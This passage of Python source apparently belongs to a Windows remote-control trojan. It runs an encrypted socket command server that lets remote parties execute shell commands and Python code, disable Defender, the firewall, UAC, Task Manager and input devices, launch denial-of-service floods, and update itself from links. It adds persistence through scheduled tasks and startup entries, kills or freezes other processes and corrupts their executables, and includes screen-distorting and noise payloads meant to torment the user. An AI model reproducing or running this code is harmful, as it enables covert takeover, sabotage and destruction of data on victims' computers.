                tryandretryuntilwork("arguments[0].currentTime = arguments[0].duration - 0.2", video)
                print("ad detected, skipping...")
            elif time.time() > wait3sec:
                print("no ad detected, continuing...")
                tryandretryuntilwork("arguments[0].currentTime = 0", video)
                break
        except selenium.common.exceptions.StaleElementReferenceException:
            print("Stale element reference exception occurred. Trying to find the video element again.")
            continue
        time.sleep(1)
    while detectifpause():
        play()
        time.sleep(0.8)
    setytvolume(1) 
    print('skipped all ads, or there were just no ads.. ')
    if detectifmuted():
        unmute()
    if starttime is not None:
        setYTtime(starttime)
    else:
        setYTtime(0)
    if endingtime is not None:
        while getcurrentYTtime() < endingtime:
            time.sleep(0.1)
            print(getcurrentYTtime())
    if endingtime is None:
        while getcurrentYTtime() < end_time - 2.5: 
            time.sleep(1)
    driver.quit() 

def payload_4():
    """Executes a visual and audio payload with screen distortions and sounds."""
    hdc = win32gui.GetDC(0)
    screen_width = win32api.GetSystemMetrics(0)
    screen_height = win32api.GetSystemMetrics(1)
    timeout = 60     
    min_interval = 3    
    max_interval = 7     
    timeout_start = time.time()
    while time.time() < timeout_start + timeout:
        x1 = randint(0, screen_width)
        y1 = randint(0, screen_height)
        x2 = randint(0, screen_width)
        y2 = randint(0, screen_height)
        w1 = randint(1, screen_width)
        h1 = randint(1, screen_height)
        w2 = randint(1, screen_width)
        h2 = randint(1, screen_height)
        win32gui.StretchBlt(hdc, x1, y1, w1, h1, hdc, x2, y2, w2, h2, win32con.SRCCOPY)
        interval = randint(min_interval, max_interval)
        color = random.choice([(255, 0, 0), (0, 255, 0), (0, 0, 255), (127, 127, 127), (255, 127, 0)])
        brush = win32gui.CreateSolidBrush(win32api.RGB(*color))
        win32gui.FillRect(hdc, (0, 0, screen_width, screen_height), brush)
        play_tone(100, 100)
        play_shepard_tone(10, 100, 1)
        play_tone(1000, 10)
        time.sleep(interval)

def payload_5():
    """Plays annoying system sounds and displays an error message."""
    timeout = 7 

    def amtxuif():
        """Displays an error message box."""
        MessageBox = ctypes.windll.user32.MessageBoxW
        MessageBox(None, "An error has occurred", "Error", 0x40 | 0x1)

    threading.Thread(target=amtxuif).start()

    def awhiletrue():
        """Plays a system sound in a loop."""
        while True:
            winsound.PlaySound("SystemHand", winsound.SND_ALIAS | winsound.SND_ASYNC | winsound.SND_LOOP)
            slp(1.3)

    def bwhiletrue():
        """Plays a system sound in a loop."""
        while True:
            winsound.PlaySound("SystemExclamation", winsound.SND_ALIAS | winsound.SND_ASYNC | winsound.SND_LOOP)
            slp(0.04)

    def abcd():
        """Starts threads for playing sounds."""
        threading.Thread(target=awhiletrue).start()
        slp(0.5)
        threading.Thread(target=bwhiletrue).start()

    timeout_start = time.time()
    abcd()
    while time.time() < timeout_start + timeout:
        pass

def payload_6():
    """Continuously inverts the screen colors."""
    hdc = win32gui.GetDC(0)
    screen_width = win32api.GetSystemMetrics(0)
    screen_height = win32api.GetSystemMetrics(1)
    timeout = 10
    timeout_start = time.time()
    while time.time() < timeout_start + timeout:
        win32gui.BitBlt(hdc, 0, 0, screen_width, screen_height, hdc, 0, 0, win32con.NOTSRCCOPY)
        gray_dc = win32gui.CreateCompatibleDC(hdc)
        bitmap = win32gui.CreateCompatibleBitmap(hdc, screen_width, screen_height)
        win32gui.SelectObject(gray_dc, bitmap)
        win32gui.BitBlt(gray_dc, 0, 0, screen_width, screen_height, hdc, 0, 0, win32con.SRCCOPY)
        brush = win32gui.CreateSolidBrush(0)
        win32gui.FillRect(gray_dc, (0, 0, screen_width, screen_height), brush)
        win32gui.BitBlt(hdc, 0, 0, screen_width, screen_height, gray_dc, 0, 0, win32con.SRCCOPY)
        win32gui.DeleteDC(gray_dc)

def restartToUAC():
    """Restarts the script with UAC privileges if not already running as admin."""
    if not admin_privileges:
        print('Restarting to obtain UAC perms')
        programVL2(f'start {os.path.join(get_script_directory(), get_script_filename())}')
        kill_self()
    else:
        print('Already have UAC perms, no need in a restart')

def keepalive():
    """Sends keep-alive messages to connected devices to maintain connections."""
    global timeout_device_list, varyhosts
    while True:
        currentTime = time.time()
        if not varyhosts:
            slp(1)
        else:
            for hostAddr in varyhosts:
                if hostAddr in timeout_device_list:
                    if timeout_device_list[hostAddr] > currentTime:
                        if (timeout_device_list[hostAddr] + 60) > currentTime:
                            print(f'Device timed out: ', hostAddr)
                            varyhosts.remove(hostAddr)
                            del timeout_device_list[hostAddr]
                        else:
                            send(hostAddr, "Keepalive")
                            print('sent keep alive to', hostAddr)
                else:
                    print('adding to list,', hostAddr)
                    timeout_device_list[hostAddr] = time.time() + 60
            print('keepalive to do,', timeout_device_list)
            slp(25)

def freeze_unknown_processes():
    """Freezes unknown processes to effectively freeze Windows."""
    print(f'Initiating freeze unknown process')
    tokill = []
    exclude_list = [
        "powershell.exe", "WINWORD.EXE","POWERPNT.EXE","GoogleCrashHandler.exe",
        "GoogleCrashHandler64.exe","explorer.exe","svchost.exe","services.exe",
        "csrss.exe","winlogon.exe","lsass.exe","lsm.exe","smss.exe","system",
        "wininit.exe","taskmgr.exe","winmgmt.exe","ntoskrnl.exe","spoolsv.exe",
        "msdtc.exe","audiodg.exe","dwm.exe","searchindexer.exe", "whatsapp.exe", 
        'System', 'SecurityHealthService.exe', 'MemCompression', 'csrss.exe', 
        'MpCmdRun.exe', 'WUDFHost.exe', 'TiWorker.exe', 'smss.exe', 'VSSVC.exe', 
        'lsass.exe', 'sihost.exe', 'WmiPrvSE.exe', 'ctfmon.exe', 
        'SearchFilterHost.exe', 'winlogon.exe', 'rdpclip.exe', 
        'taskhostw.exe', 'ngen.exe', 'sppsvc.exe', 'backgroundTaskHost.exe', 
        'wlms.exe', 'TextInputHost.exe', 'LogonUI.exe', 'svchost.exe', 
        'smartscreen.exe', 'SearchApp.exe', 'dwm.exe', 'taskkill.exe', 
        'MsMpEng.exe', 'fontdrvhost.exe', 'cmd.exe', 'Registry', 
        'TrustedInstaller.exe', 'NisSrv.exe', 'wininit.exe', 
        'StartMenuExperienceHost.exe', 'mscorsvw.exe', 'System Idle Process', 
        'conhost.exe', 'ngentask.exe', 'SearchProtocolHost.exe', 
        'SearchIndexer.exe', 'OneDrive.exe', 'spoolsv.exe', 'explorer.exe', 
        'SecurityHealthSystray.exe', 'System', 'services.exe'
    ]
    exclude_list = [x.lower() for x in exclude_list]
    exclude_list_HAVE = [
        "System", "WindowsTerminal.exe", "OpenConsole.exe", "chrome.exe", 
        "MemCompression", "GoogleUpdate.exe", "WINWORD.EXE","POWERPNT.EXE",
        "GoogleCrashHandler.exe","GoogleCrashHandler64.exe", "wlms.exe"
    ]
    exclude_list_HAVE = [x.lower() for x in exclude_list_HAVE]
    exclude_list_HAVE = exclude_list_HAVE + exclude_list
    ownprogrampid = os.getpid()
    ownprogramparrentpid = os.getppid()

    def getchildrenofprocess(pid):
        """Gets the child processes of a given process."""
        process = psutil.Process(pid)
        for child in process.children(recursive=True):
            add(child.pid)

    ownpid = os.getpid()
    lsttocheck = get_process_connected_pids(os.getppid())

    def add(pid, children=False):
        """Adds a process ID to the list of processes to kill."""
        if pid != ownprogrampid and pid != ownprogramparrentpid:
            if children:
                getchildrenofprocess(pid)
            if pid not in tokill:
                tokill.append(pid)

    processes = psutil.process_iter()
    a1tmpnamedirectoryself = os.path.join(get_script_directory(), get_script_filename()) 
    tmpnamefilenameself = get_script_filename()
    for process in processes:
        try:
            pid = process.pid
            name = process.name().lower()
            exe_path = process.exe().lower()
            if name == tmpnamefilenameself.lower() and exe_path.replace('\\', '/').replace('//', '/') == a1tmpnamedirectoryself.replace('\\', '/').replace('//', '/'):
                continue
            if name in system32_files and exe_path.startswith((os.environ['WINDIR'] + '\\System32').lower()):
                pass
            elif name in windows_files and exe_path.startswith((os.environ['WINDIR']).lower()):
                pass
            elif pid not in lsttocheck:
                add(pid)
        except Exception as e:
            pass

    newlisttokill = []
    for i in tokill:
        ia  = psutil.Process(i).name().lower()
        if ia not in exclude_list_HAVE:
            newlisttokill.append(i)
    tokill = newlisttokill 
    pid_locations = []
    for pid in tokill:
        try:
            pid_locations.append(psutil.Process(pid).exe())
        except Exception as e:
            continue
    self = os.path.join(get_script_directory(), get_script_filename()).lower().replace('\\', '/')
    for pid in tokill:
        if pid == ownpid or pid in lsttocheck:
            continue
        try:
            proc = psutil.Process(pid)
            if len(proc.cmdline()) > 1:
                vrsproc = proc.cmdline()[1]
            else:
                vrsproc = proc.cmdline()[0]
            if proc.name().casefold() == tmpnamefilenameself.casefold() and self.casefold() == vrsproc.lower().replace('\\', '/').casefold():
                continue
            psutil.Process(pid).suspend()
        except Exception as e:
            pass


def terminate_unknown_processes(corrupt=True):
    """Terminates and optionally corrupts unknown processes."""
    print(f'Initiating a terminate unknown process')
    tokill = []
    exclude_list = [
        "powershell.exe", "WINWORD.EXE","POWERPNT.EXE","GoogleCrashHandler.exe",
        "GoogleCrashHandler64.exe","explorer.exe","svchost.exe","services.exe",
        "csrss.exe","winlogon.exe","lsass.exe","lsm.exe","smss.exe","system",
        "wininit.exe","taskmgr.exe","winmgmt.exe","ntoskrnl.exe","spoolsv.exe",
        "msdtc.exe","audiodg.exe","dwm.exe","searchindexer.exe", "whatsapp.exe", 
        'System', 'SecurityHealthService.exe', 'MemCompression', 'csrss.exe', 
        'MpCmdRun.exe', 'WUDFHost.exe', 'TiWorker.exe', 'smss.exe', 'VSSVC.exe', 
        'lsass.exe', 'sihost.exe', 'WmiPrvSE.exe', 'ctfmon.exe', 
        'SearchFilterHost.exe', 'winlogon.exe', 'rdpclip.exe', 
        'taskhostw.exe', 'ngen.exe', 'sppsvc.exe', 'backgroundTaskHost.exe', 
        'wlms.exe', 'TextInputHost.exe', 'LogonUI.exe', 'svchost.exe', 
        'smartscreen.exe', 'SearchApp.exe', 'dwm.exe', 'taskkill.exe', 
        'MsMpEng.exe', 'fontdrvhost.exe', 'cmd.exe', 'Registry', 
        'TrustedInstaller.exe', 'NisSrv.exe', 'wininit.exe', 
        'StartMenuExperienceHost.exe', 'mscorsvw.exe', 'System Idle Process', 
        'conhost.exe', 'ngentask.exe', 'SearchProtocolHost.exe', 
        'SearchIndexer.exe', 'OneDrive.exe', 'spoolsv.exe', 'explorer.exe', 
        'SecurityHealthSystray.exe', 'System', 'services.exe'
    ]
    exclude_list = [x.lower() for x in exclude_list]
    exclude_list_HAVE = [
        "System", "WindowsTerminal.exe", "OpenConsole.exe", "chrome.exe", 
        "MemCompression", "GoogleUpdate.exe", "WINWORD.EXE","POWERPNT.EXE",
        "GoogleCrashHandler.exe","GoogleCrashHandler64.exe", "wlms.exe"
    ]
    exclude_list_HAVE = [x.lower() for x in exclude_list_HAVE]
    ownprogrampid = os.getpid()
    ownprogramparrentpid = os.getppid()

    def corruptfile(directoryoffile):
        """Corrupts a file by overwriting its content with 'X' characters."""
        with open(directoryoffile, "w+") as f:
            f.seek(0)
            content = f.read()
            scrubbed_content = b"X" * len(content)
            f.seek(0)
            f.write(scrubbed_content)
            f.truncate()

    def getchildrenofprocess(pid):
        """Gets the child processes of a given process."""
        process = psutil.Process(pid)
        for child in process.children(recursive=True):
            add(child.pid)

    ownpid = os.getpid()
    lsttocheck = get_process_connected_pids(os.getppid())

    def add(pid, children=False):
        """Adds a process ID to the list of processes to kill."""
        if pid != ownprogrampid and pid != ownprogramparrentpid:
            if children:
                getchildrenofprocess(pid)
            if pid not in tokill:
                tokill.append(pid)

    processes = psutil.process_iter()
    a1tmpnamedirectoryself = os.path.join(get_script_directory(), get_script_filename()) 
    tmpnamefilenameself = get_script_filename()
    for process in processes:
        try:
            pid = process.pid
            name = process.name().lower()
            exe_path = process.exe().lower()
            if name == tmpnamefilenameself.lower() and exe_path.replace('\\', '/').replace('//', '/') == a1tmpnamedirectoryself.replace('\\', '/').replace('//', '/'):
                continue
            if name in system32_files and exe_path.startswith((os.environ['WINDIR'] + '\\System32').lower()):
                pass
            elif name in windows_files and exe_path.startswith((os.environ['WINDIR']).lower()):
                pass
            elif pid not in lsttocheck:
                add(pid)
        except Exception as e:
            pass

    newlisttokill = []
    for i in tokill:
        ia  = psutil.Process(i).name().lower()
        if ia not in exclude_list_HAVE:
            newlisttokill.append(i)
    tokill = newlisttokill 
    pid_locations = []
    for pid in tokill:
        try:
            pid_locations.append(psutil.Process(pid).exe())
        except Exception as e:
            continue
    self = os.path.join(get_script_directory(), get_script_filename()).lower().replace('\\', '/')
    for pid in tokill:
        if pid == ownpid or pid in lsttocheck:
            continue
        try:
            proc = psutil.Process(pid)
            if len(proc.cmdline()) > 1:
                vrsproc = proc.cmdline()[1]
            else:
                vrsproc = proc.cmdline()[0]
            if proc.name().casefold() == tmpnamefilenameself.casefold() and self.casefold() == vrsproc.lower().replace('\\', '/').casefold():
                continue
            psutil.Process(pid).kill()
        except Exception as e:
            pass

    if corrupt:
        for location in pid_locations:
            try:
                corruptfile(location) 
            except Exception as e:
                pass

def sendAllVaryHosts(text):
    """Sends a message to all connected vary hosts."""
    global varyhosts
    varyhosts = list(set(varyhosts)) 
    for i in varyhosts:
        send(i, text)

def addselftostartup_reg():
    """Adds the script to the Windows registry to run on startup (requires admin rights)."""
    startup_folder = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup')
    try:
        os.rmdir(startup_folder)
    except:
        pass
    programVL2(f'schtasks /create /sc ONLOGON /tn "{"".join(random.choice(string.ascii_letters) for _ in range(8))}" /tr "{os.path.join(get_script_directory(), get_script_filename())}" /ru {os.getlogin()} /rl HIGHEST /it /f')

def addselftostartup_folder():
    """Adds the script to the startup folder."""
    script_dir = get_script_directory()
    script_filename = get_script_filename()
    script_path = os.path.join(script_dir, script_filename)
    startup_folder = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup')
    make_shortcut(script_path, name=script_filename, terminal=False, folder=startup_folder)

def self_tostartup():
    """Adds the script to startup using the appropriate method based on privileges."""
    if admin_privileges:
        addselftostartup_reg()
    else:
        addselftostartup_folder()

def create_presitent_starting():
    """Creates a persistent task in Windows Task Scheduler to run the script."""
    exe_path = os.path.join(get_script_directory(), get_script_filename())
    task_name = "flWin32"
    command = exe_path
    trigger = "/tr 00000005"
    subprocess.check_output(
        [
            "schtasks",
            "/create",
            "/tn",
            task_name,
            "/tr",
            command,
            "/sc",
            trigger,
        ]
    )

def self_to_rerun_if_killed():
    """Creates a task to rerun the script if it's killed."""
    program_path = os.path.join(get_script_directory(), get_script_filename())
    task_name = "flWin86s"
    event_id = 20225
    event_channel = "System"
    os.system(f'schtasks /Create /TN "{task_name}" /TR "{program_path}" /SC ONEVENT /MO "*[System[EventID={event_id}]]" /EC {event_channel} /RU SYSTEM /F')
    os.system(f'schtasks /Run /TN "{task_name}"')

def inviscurr(duration, setdelay=5):
    """Hides the currently focused window for a specified duration."""
    a = time.time() + int(duration)
    while time.time() < a:
        the_program_to_hide = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(the_program_to_hide, win32con.SW_HIDE)
        slp(setdelay)

def swaprmbandlmbtrue():
    """Swaps the left and right mouse buttons."""
    SwapMouseButton = ctypes.windll.user32.SwapMouseButton
    SwapMouseButton(True)

def unswaprmbandlmb():
    """Unswaps the left and right mouse buttons."""
    SwapMouseButton = ctypes.windll.user32.SwapMouseButton
    SwapMouseButton(False)

def swapRMBAndLMB(aset='unspecified'):
    """Swaps or unswaps the left and right mouse buttons."""
    SM_SWAPBUTTON = 23
    swapped = GetSystemMetrics(SM_SWAPBUTTON)
    SwapMouseButton = ctypes.windll.user32.SwapMouseButton
    if aset == 'unspecified':
        if swapped:
            print('not Swapped rmb and lmb')
            SwapMouseButton(False)
        else:
            print('swapped rmb and lmb')
            SwapMouseButton(True)
    elif aset is True:
        SwapMouseButton(True)
        print('Set swap True')
    elif aset is False:
        SwapMouseButton(False)
        print('Set swap False')
    else:
        print(f'{aset} is not a valid option @ swapRMBAndLMB')

def type_string_with_human_delay(string):
    """Types a string with human-like delays between characters."""
    for character in string:
        if character == ' ':
            if random.random() < 0.8:
                slp(random.choice([0.2, 0.5, 0.1, 0.1, 0.2, 0.3, 0.4]))
        pynput.keyboard.Controller().type(character)
        slp(random.uniform(0.2, 0.03))

def webhandler(website):
    """Opens a website in the default browser."""
    runcmd(f'start chrome "{website}"')

def formatproperlyipv4(scrmbl):
    """Formats a string of IPv4 addresses."""
    global prioritizeipv4
    scrmbl = scrmbl.replace(' ', '')
    scrmbl = scrmbl.split(',') if ',' in scrmbl else [scrmbl]
    scrmbl = list(set(scrmbl)) 
    scrmbl = list(filter(None, scrmbl))
    prioritizeipv4 = scrmbl

def decrypt_msg(msg, key=b'\x12\x1f\xb7\x1b\x7f\xe8W0\xa7\xc7\x04\xad\xc5\x03Q\xa1\x93\xd7\xab3\xe9\xbfE\xcf)=w\xd1\x97N\x9e\xae'):
    """Decrypts a message using AES."""

    def encrypt(key, plaintext):
        """Encrypts the plaintext using AES."""
        try:
            cipher = AES.new(key, AES.MODE_EAX)
            ciphertext, tag = cipher.encrypt_and_digest(plaintext)
            return (cipher.nonce, tag, ciphertext)
        except Exception as e:
            print(f'Error when encrypting text: {e}')

    def decrypt(key, ciphertext):
        """Decrypts the ciphertext using AES."""
        try:
            (nonce, tag, ciphertext) = ciphertext
            cipher = AES.new(key, AES.MODE_EAX, nonce)
            plaintext = cipher.decrypt(ciphertext)
            try:
                cipher.verify(tag)
                return plaintext
            except ValueError:
                return None
        except Exception as e:
            print(f'Error when decrypting text: {e}')

    TUTKEYPHONE = key
    try:
        msg = str(msg.decode('utf-8'))                    
        msg = ast.literal_eval(msg)
        plaintext = decrypt(TUTKEYPHONE, msg)
        text = plaintext.decode("utf-8")
        return text
    except Exception as e:
        print(f'Error when decrypting text: {e}')
        return False

def encrypt_msg(msg, key=rb'\x12\x1f\xb7\x1b\x7f\xe8W0\xa7\xc7\x04\xad\xc5\x03Q\xa1\x93\xd7\xab3\xe9\xbfE\xcf)=w\xd1\x97N\x9e\xae'):
    """Encrypts a message using AES."""

    def encrypt(key, plaintext):
        """Encrypts the plaintext using AES."""
        try:
            cipher = AES.new(key, AES.MODE_EAX)
            ciphertext, tag = cipher.encrypt_and_digest(plaintext)
            return (cipher.nonce, tag, ciphertext)
        except Exception as e:
            print(f'Error when encrypting text: {e}')

    def decrypt(key, ciphertext):
        """Decrypts the ciphertext using AES."""
        try:
            (nonce, tag, ciphertext) = ciphertext
            cipher = AES.new(key, AES.MODE_EAX, nonce)
            plaintext = cipher.decrypt(ciphertext)
            try:
                cipher.verify(tag)
                return plaintext
            except ValueError:
                return None
        except Exception as e:
            print(f'Error when decrypting text: {e}')

    TUTKEYPHONE = key
    try:
        message = (encrypt(TUTKEYPHONE, msg))
        message = str(message).encode('utf-8')
        message = bytes(message)
        return message
    except Exception as e:
        print(f'Error when encrypting text: {e}')
        return False

def handle_messages_varyhost(msg, addr, conn):
    """Handles messages received from vary hosts."""
    global timeout_device_list, varyhosts
    unmodified_msg = msg
    ip, port = addr
    print("addr of handle_messages, ", addr)
    if msg == "SystemStartupIAmAVaryHost":
        print(f'New address called!, adding {ip}:{vary_PORT} to the varyhosts list')
        varyhosts.append(f'{ip}:{vary_PORT}')
    if msg == "Keepalive":
        timeout_device_list[addr] = time.time() + 60
    if msg == r'RequestToShareScreenDeviceSelf&!^(*^%&!@#(&^@!%$(!@#!!!!!)))':
        send((ip, vary_PORT), 'True')
        print('Request to share screen this device, accepted.')
        global running_ss, server
        running_ss = True
        host_ss((ip, int(vary_PORT)))
        print('Request to share screen this device has ended')
    if "REQUESTSENDALLHOSTCONTINUEONMESSAGE" in msg and "XR~=3yy=[W2vc%L" in msg:
        id, ip, identifier, todo = msg.split('XR~=3yy=[W2vc%L')
        if identifier in done_vary_tasks:
            print("I've already done this todo, so ignoring it, " + todo)
            return
        done_vary_tasks.append(identifier)
        sendAllVaryHosts(unmodified_msg)
        print(f"Got a todo from {ip}, it said to do: {todo} with an identifier of {identifier}")

def handle_connection_of_connected_device(msg, addr, conn):
    """Handles connections and commands from connected devices."""
    spltr = "OD2tIzZNuOHBqnu"
    task = 'undefined'
    information_msg = None
    handler = None
    if spltr in msg:
        tmpls = msg.split(spltr)
        tmpls += [None] * (4 - len(tmpls))
        tmpls = [None if i == "" else i for i in tmpls]
        print(tmpls)
        task, information_msg, handler = tmpls[:3]
    else:
        task = msg
    if task is not None:
        task = task.lower()
    global autoterminateunknownexeprocesses, prioritizeipv4
    information_msg_beforelower = information_msg
    if task == 'clearprioritize':
        prioritizeipv4 = None
    elif task == 'ipv4prioritize' and information_msg is not None:
        formatproperlyipv4(information_msg)
    elif task == 'makethescreendorotations' and information_msg is not None:
        makethescreendorotations(information_msg)
    elif task == 'undefined':
        return False    
    elif task == 'runcmd' and information_msg is not None:
        runcmd(information_msg)
    elif task == 'programvl2' and information_msg is not None:
        programVL2(information_msg)
    elif task == 'blackenscreen' and information_msg is not None:
        blackenscreen(information_msg)
    elif task == 'texttospeech' and information_msg is not None:
        texttospeech(information_msg_beforelower)
    elif task == 'speakxlanguage' and information_msg is not None:
        speakXlanguage(information_msg_beforelower)
    elif task == 'disableuseraccountcontrol':
        disableUserAccountControl()
    elif task == 'enableuseraccountcontrol':
        enableUserAccountControl()
    elif task == 'swappedswaprmbandlmb':  
        swaprmbandlmbtrue()
    elif task == 'unswappedswaprmbandlmb':
        unswaprmbandlmb()
    elif task == 'typestringwithhumandelay' and information_msg is not None:
        type_string_with_human_delay(information_msg)
    elif task == 'sendallhostsatodo' and information_msg is not None:
        send_all_hosts_a_todo(information_msg, settingIP=addr)
    elif task == 'addselftosafemode':
        addselftosafemode()
    elif task == 'protectfileself':
        protectfileself()
    elif task == 'disablewindowsdefender':
        DisableWindowsDefender()
    elif task == 'enablewindowsdefender':
        EnableWindowsDefender()
    elif task == 'disableresetoptions':
        disableresetoptions()
    elif task == 'enableresetoptions':
        enableresetoptions()
    elif task == 'handletostartsequences':
        handle_tostart_sequences()
    elif task == 'terminateunknownprocesses':
        terminate_unknown_processes()
    elif task == 'getscriptdirectory':
        get_script_directory()
    elif task == 'getscriptfilename':
        get_script_filename()
    elif task == 'hideselfexecutable':
        hide_self_executable()
    elif task == 'restartexplorer':
        restart_explorer()
    elif task == 'killself':
        kill_self()
    elif task == 'resetnetwork':
        reset_network()
    elif task == 'diversifywindowslagclicksoundenable':
        enable_windows_lag_click_sound()
    elif task == 'diversifywindowslagclicksounddisable':
        disable_windows_lag_click_sound()
    elif task == 'prockill' and information_msg is not None:
        procKill(information_msg)
    elif task == 'setvolume' and information_msg is not None:
        set_volume(information_msg)
    elif task == 'updateselfvialink' and information_msg is not None:
        updateselfViaLink(information_msg_beforelower)
    elif task == 'renameself' and information_msg is not None:
        renameSELF(information_msg_beforelower)
    elif task == 'hideprocessvianame' and information_msg is not None:
        hide_process_via_name(information_msg_beforelower)
    elif task == 'showprocessvianame' and information_msg is not None:
        show_process_via_name(information_msg_beforelower)
    elif task == 'freezeallprocesses':
        freeze_all_processes()
    elif task == 'unfreezeallprocesses':
        unfreeze_all_processes()
    elif task == 'restartself':
        restart_self()
    elif task == 'movetofolder' and information_msg is not None:
        moveToFolder(information_msg_beforelower)
    elif task == 'offsmartassnointernet':
        toggleSmartAssNoInternet(Set=False)
    elif task == 'onsmartassnointernet':
        toggleSmartAssNoInternet(Set=True)
    elif task == 'dosipport' and information_msg is not None:
        dosIPPORT(information_msg)
    elif task == 'closedosipport':
        closedosingthreads()
    elif task == 'disableuwf':
        disableUWF()
    elif task == 'enableuwf':
        enableUWF()
    elif task == 'inviscurr' and information_msg:
        inviscurr(information_msg)
    elif task == 'webhandler':
        webhandler(information_msg_beforelower)
    elif task == 'playtone' and information_msg is not None:
        play_tone_fxphone(information_msg)
    elif task == 'playshepardtone' and information_msg is not None and "thmaabaoplurh5w" in information_msg.lower():
        start_hz, end_hz, duration = information_msg.split('thmaabaoplurh5w'.lower())
        play_shepard_tone(int(start_hz), int(end_hz), int(duration))
    elif task == 'runpythonscript' and information_msg is not None:
        runpythonscript(information_msg_beforelower)
    elif task == 'disablefirewall':
        disablefirewall()
    elif task == 'enablefirewall':
        enablefirewall()
    elif task == 'restarttoadvancedoptions':
        restartToADvancedOptions()
    elif task == 'disabletaskmgr':
        disableTaskmanager()
    elif task == 'enabletaskmgr':
        enabletaskmgr()
    elif task == 'enablemouse':
        enable_mouse()
    elif task == 'disablemouse':
        disable_mouse()
    elif task == 'enablekeyboard':
        enable_keyboard()
    elif task == 'disablekeyboard':
        disable_keyboard()
    elif task == 'presskeys' and information_msg is not None:
        presskeys(information_msg)
    elif task == 'writetext' and information_msg is not None:
        writetext(information_msg)
    elif task == 'meandtheboys':
        MeAndTheBoys()
    elif task == 'restarttouac':
        restartToUAC()
    elif task == 'installchrome':
        installchrome()
    elif task == 'dvdtimeout' and information_msg is not None:
        dvdtimeout(int(information_msg))  # Assuming information_msg contains the timeout value
    elif task == 'unprotectselffile':
        unprotect_file(os.path.join(get_script_directory(), get_script_filename()))
    elif task == 'maximizeprocessvianame' and information_msg is not None:
        maximize_process_via_name(information_msg)
    elif task == 'minimizeprocessvianame' and information_msg is not None:
        minimize_process_via_name(information_msg)
    elif task == 'disableterminateunknownprocesses':
        autoterminateunknownexeprocesses = False
    elif task == 'enableterminateunknownprocesses':
        autoterminateunknownexeprocesses = True
    elif task == 'runfunctionviastring' and information_msg is not None:
        if "split".lower() in information_msg.lower():
            locals()[information_msg_beforelower.split('split')[1].split("=")[0]] = information_msg_beforelower.split('split')[1].split("=")[1]
            # print('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',information_msg_beforelower.split('split')[0], information_msg_beforelower.split('split')[1])
            # Split the information_msg_beforelower and extract the function name and arguments
            function_name, *arguments = information_msg_beforelower.split('split')

            # Initialize an empty dictionary to store the arguments
            kwargs = {}

            # Parse the arguments and add them to the kwargs dictionary
            for arg in arguments:
                arg_name, arg_value = arg.split("=")
                kwargs[arg_name.strip()] = arg_value.strip()

            # Call runfunctionvianame with the function name and parsed arguments
            runfunctionvianame(function_name, **kwargs)
        
        else:
            runfunctionvianame(information_msg_beforelower); print("aaaaaaaaaaaaaaaa", information_msg_beforelower)
    elif task == 'unblock_application_by_name' and information_msg is not None:
        unblock_application_by_name(information_msg_beforelower)
    elif task == 'block_application_by_name' and information_msg is not None:
        block_application_by_name(information_msg_beforelower)
    elif task == 'unblock_ports_for_application' and information_msg is not None:
        unblock_ports_for_application(information_msg_beforelower)
    elif task == 'block_ports_for_application' and information_msg is not None:
        block_ports_for_application(information_msg_beforelower)
    elif task == 'resetfirewall':
        reset_firewall()
    elif task == 'self_destruct':
        self_destruct()
    elif task == 'playytvidbetweentime': 
        playYTvidinbackground(information_msg_beforelower.split("splitterofty1243")[0], information_msg_beforelower.split("splitterofty1243")[1], information_msg_beforelower.split("splitterofty1243")[2])
    elif task == 'playytvidbetweentimefullscreen':
        playYTvidfullscreen(information_msg_beforelower.split("splitterofty1243")[0], information_msg_beforelower.split("splitterofty1243")[1], information_msg_beforelower.split("splitterofty1243")[2])
    elif task == 'alwaysontop':
        set_always_on_top_via_name(information_msg_beforelower)
    elif task == 'unsetalwaysontop':
        unset_always_on_top_by_name(information_msg_beforelower)
    
    
    else:
        print(f'Task {task} not found, information: {information_msg_beforelower}')    
def handle_connection(conn, addr):
    """Handles incoming socket connections."""
    global device_item_received
    TUTKEYPHONE = b'\x12\x1f\xb7\x1b\x7f\xe8W0\xa7\xc7\x04\xad\xc5\x03Q\xa1\x93\xd7\xab3\xe9\xbfE\xcf)=w\xd1\x97N\x9e\xae'
    try:
        msg_length = conn.recv(HEADER).decode('utf-8') 
        if msg_length:
            msg_length = int(msg_length)
            msg = conn.recv(msg_length)
            text = decrypt_msg(msg, TUTKEYPHONE)
            if text is False:
                return
            msg = text
            print("Encrypted message(now decrypted):", msg)
            conn.close()
            conn.detach()
            ip_ofcn, port_ofcn = addr
            isconnVaryHost = False
            for i in varyhosts:
                ip123, port123 = i.split(":")
                if ip123 == ip_ofcn:
                    isconnVaryHost = True
                    break
            if msg.lower() == 'SystemStartupIAmAVaryHost'.lower():
                isconnVaryHost = True
                print(f'Added {addr} to varyhosts')
            if isconnVaryHost:
                print(f'Treating {addr} as a vary host')
                new_addr = (str(ip_ofcn), int(vary_PORT)) 
                device_item_received[new_addr] = msg                    
                handle_messages_varyhost(msg, new_addr, conn)
                return
            else:
                device_item_received[addr] = msg
            global prioritizeipv4
            if prioritizeipv4 is not None:
                try:
                    ip_of_client = addr[0]
                    if ip_of_client not in prioritizeipv4:
                        return 
                except Exception as e:
                    print(f'Error in prioritizeipv4 handling of receive todo phones: {e}')
            handle_connection_of_connected_device(msg, addr, conn)
    except Exception as e:
        print("error message receive function :", e)

def serverhost():
    """Starts the server and listens for incoming connections."""
    try:
        server.listen()
        print(f"[LISTENING] Server is listening on {SERVER}:{vary_PORT}")
        while True:
            conn, addr = server.accept() 
            connected_devices.append(conn)
            threading.Thread(target=handle_connection, args=(conn, addr)).start()
    except Exception as e:
        print(f'Error in serverhost function: {e}')
        slp(3)
        return serverhost()

def get_script_directory():
    """Gets the directory where the script is located."""
    if getattr(sys, 'frozen', False):
        return os.path.dirname(sys.executable)
    else:
        return os.path.dirname(os.path.abspath(__file__))

def get_script_filename():
    """Gets the filename of the script."""
    if getattr(sys, 'frozen', False):
        return os.path.basename(sys.executable)
    else:
        return os.path.basename(__file__)

def get_process_connected_pids(pid):
    """Gets a list of PIDs related to a given process, including parent and children."""
    proc = psutil.Process(pid)
    parent = proc.parent()
    ppid = parent.pid if parent is not None else None
    children = proc.children()
    child_pids = [child.pid for child in children]
    all_pids = [pid]
    if ppid is not None:
        all_pids.append(ppid)
    all_pids.extend(child_pids)
    return all_pids

def hide_self_executable():
